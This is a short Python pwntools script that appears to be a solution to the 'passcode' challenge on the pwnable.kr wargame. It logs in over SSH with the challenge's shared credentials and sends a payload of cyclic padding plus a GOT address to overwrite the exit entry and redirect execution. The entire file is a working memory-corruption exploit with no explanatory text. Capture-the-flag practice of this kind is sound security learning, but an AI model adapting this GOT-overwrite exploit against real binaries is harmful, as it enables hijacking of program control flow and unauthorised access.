from pwn import *

exit_got_addr = p32(0x0804a004)
offset = 96
system_addr = "134514135"

s = ssh(host="pwnable.kr", user="passcode", password="guest", port=2222)
p = s.process("./passcode")

payload = cyclic(offset) + exit_got_addr + system_addr
log.info("sending payload")
p.sendline(payload)

print p.recvall()

p.close()
s.close()
